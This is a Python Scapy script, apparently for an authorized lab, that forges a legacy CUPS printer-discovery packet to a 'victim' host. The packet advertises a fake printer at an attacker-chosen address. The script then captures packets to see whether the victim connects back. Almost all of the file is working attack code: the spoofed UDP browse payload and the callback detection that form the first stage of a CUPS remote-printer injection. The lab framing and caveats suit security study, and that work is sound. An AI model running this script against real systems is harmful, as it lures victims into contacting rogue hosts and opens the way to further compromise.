#!/usr/bin/env python3
import argparse
import ipaddress
import logging
import math
import re
import socket
import time
from pathlib import Path

from scapy.all import AsyncSniffer, IP, Raw, TCP, UDP, send, wrpcap

LOG = logging.getLogger("cups_attack")
VICTIM_HOST = "victim"
PRINTER_HOST = "printer"
PRINTER_PORT = 8631
DISCOVERY_PORT = 631


def resolve_ipv4(value):
    """Accept an IPv4 address or a resolvable Docker service hostname."""
    try:
        return str(ipaddress.IPv4Address(value))
    except ipaddress.AddressValueError:
        try:
            return socket.gethostbyname(value)
        except socket.gaierror as exc:
            raise argparse.ArgumentTypeError(
                f"Cannot resolve {value!r}: {exc}"
            ) from exc


def safe_field(value):
    if any(ch in value for ch in '\r\n"'):
        raise argparse.ArgumentTypeError(
            "Fields cannot contain newlines or double quotes"
        )
    return value


def printer_name(value):
    if not re.fullmatch(r"[A-Za-z0-9_-]{1,64}", value):
        raise argparse.ArgumentTypeError(
            "Use 1-64 letters, digits, underscores or hyphens"
        )
    return value


def parse_args():
    p = argparse.ArgumentParser(
        description="CUPS discovery demonstration in an authorized lab"
    )
    p.add_argument(
        "--target", default=VICTIM_HOST,
        help="Victim IP or hostname (default: victim)"
    )
    p.add_argument(
        "--advertise-ip", default=PRINTER_HOST,
        help="Printer IP or hostname (default: printer)"
    )
    p.add_argument(
        "--port", type=int, default=PRINTER_PORT,
        help="Printer HTTP/IPP TCP port (default: 8631)"
    )
    p.add_argument("--name", type=printer_name, default="LabPrinter")
    p.add_argument(
        "--location", type=safe_field, default="University Lab"
    )
    p.add_argument(
        "--info", type=safe_field, default="Scapy Test Printer"
    )
    p.add_argument(
        "--model", type=safe_field, default="Virtual Printer"
    )
    p.add_argument(
        "--type", dest="printer_type", default="0",
        help="CUPS printer type in hexadecimal (default: 0)"
    )
    p.add_argument(
        "--state", type=int, default=3,
        help="IPP printer state (default: 3, idle)"
    )
    p.add_argument(
        "--iface", help="Network interface for packet capture"
    )
    p.add_argument(
        "--timeout", type=float, default=15,
        help="Seconds to observe traffic after sending (default: 15)"
    )
    p.add_argument(
        "--pcap", type=Path, default=Path("pcap_files/cups_discovery.pcap")
    )
    p.add_argument(
        "--log", type=Path, default=Path("evidence/cups_attack.log")
    )

    args = p.parse_args()

    if not 1 <= args.port <= 65535 or not math.isfinite(args.timeout) or args.timeout <= 0:
        p.error("--port must be 1..65535 and --timeout must be positive")

    if not 0 <= args.state <= 255:
        p.error("--state must be between 0 and 255")

    if not re.fullmatch(r"[0-9A-Fa-f]{1,8}", args.printer_type):
        p.error("--type must be hexadecimal (e.g. 0 or 2)")

    try:
        args.target_ip = resolve_ipv4(args.target)
        args.printer_ip = resolve_ipv4(args.advertise_ip)
    except argparse.ArgumentTypeError as exc:
        p.error(str(exc))

    return args


def main():
    args = parse_args()

    args.log.parent.mkdir(parents=True, exist_ok=True)
    args.pcap.parent.mkdir(parents=True, exist_ok=True)

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(message)s",
        handlers=[
            logging.StreamHandler(),
            logging.FileHandler(args.log, encoding="utf-8")
        ],
    )

    uri = f"http://{args.printer_ip}:{args.port}/printers/{args.name}"

    # Legacy CUPS browse record:
    # type state URI "location" "info" "make-model"
    payload = (
        f'{args.printer_type} {args.state} {uri} '
        f'"{args.location}" "{args.info}" "{args.model}"\n'
    ).encode("utf-8")

    packet = (
        IP(dst=args.target_ip)
        / UDP(sport=DISCOVERY_PORT, dport=DISCOVERY_PORT)
        / Raw(load=payload)
    )

    LOG.info("Victim: %s -> %s", args.target, args.target_ip)
    LOG.info("Printer: %s -> %s", args.advertise_ip, args.printer_ip)
    LOG.info("Advertising printer URI: %s", uri)
    LOG.info("Discovery payload: %r", payload)

    captured = []
    observed_callback = False

    def record(pkt):
        nonlocal observed_callback

        if IP not in pkt:
            return

        ip = pkt[IP]
        relevant = (
            ip.src in (args.target_ip, args.printer_ip)
            or ip.dst in (args.target_ip, args.printer_ip)
        )

        if not relevant:
            return

        captured.append(pkt)

        if (
            TCP in pkt
            and ip.src == args.target_ip
            and ip.dst == args.printer_ip
            and pkt[TCP].dport == args.port
            and pkt[TCP].flags & 0x02
            and not pkt[TCP].flags & 0x10
        ):
            observed_callback = True
            LOG.info(
                "Observed victim TCP connection attempt to "
                "advertised printer: %s -> %s:%s",
                args.target_ip,
                args.printer_ip,
                args.port,
            )

    sniffer = AsyncSniffer(
        iface=args.iface,
        prn=record,
        store=False
    )
    started = False

    try:
        sniffer.start()
        started = True

        time.sleep(0.4)

        LOG.info(
            "Sending one legacy CUPS discovery packet to %s:%d/udp",
            args.target_ip,
            DISCOVERY_PORT
        )
        send(packet, verbose=False)

        time.sleep(args.timeout)
    except KeyboardInterrupt:
        LOG.info("Monitoring stopped by user")
    finally:
        if started:
            try:
                sniffer.stop()
            except Exception as exc:
                LOG.warning("Could not stop capture: %s", exc)

        wrpcap(str(args.pcap), captured)

        LOG.info(
            "Saved %d packets to %s",
            len(captured),
            args.pcap
        )

        if observed_callback:
            LOG.info(
                "RESULT: Victim connection attempt observed "
                "in attacker capture"
            )
        else:
            LOG.info(
                "RESULT: No victim connection attempt visible "
                "in attacker capture"
            )

        LOG.info(
            "Docker bridge traffic between victim and printer "
            "may not be visible to attacker."
        )
        LOG.info(
            "Verify callback independently in printer container "
            "logs or packet capture."
        )
        LOG.info(
            "A callback does not prove printer registration "
            "or code execution."
        )


if __name__ == "__main__":
    main()
